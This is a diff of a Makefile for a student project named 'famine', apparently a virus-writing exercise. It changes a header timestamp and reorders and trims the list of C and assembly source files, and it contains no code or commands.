@@ -6,7 +6,7 @@
 #    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2018/04/10 17:19:11 by agrumbac          #+#    #+#              #
-#    Updated: 2019/06/07 07:52:06 by agrumbac         ###   ########.fr        #
+#    Updated: 2019/06/07 10:00:02 by agrumbac         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -14,7 +14,12 @@
 
 NAME = famine
 
-SRC =	infect/virus.c                \
+SRC =	famine.s                      \
+	utils.c                       \
+	detect_spy.c                  \
+	syscall.c                     \
+	decrypt.s                     \
+	infect/virus.c                \
 	infect/accessors.c            \
 	infect/adjust_references.c    \
 	infect/copy_to_clone.c        \
@@ -26,13 +31,6 @@ SRC =	infect/virus.c                \
 	infect/iterators.c            \
 	infect/packer.c               \
 	infect/setup_payload.c        \
-	famine.s                      \
-	dear_client.c                 \
-	utils.c                       \
-	detect_spy.c                  \
-	syscall.c                     \
-	decrypt.s                     \
-	unpacker.c                    \
 	main.c
 
 CC = clang
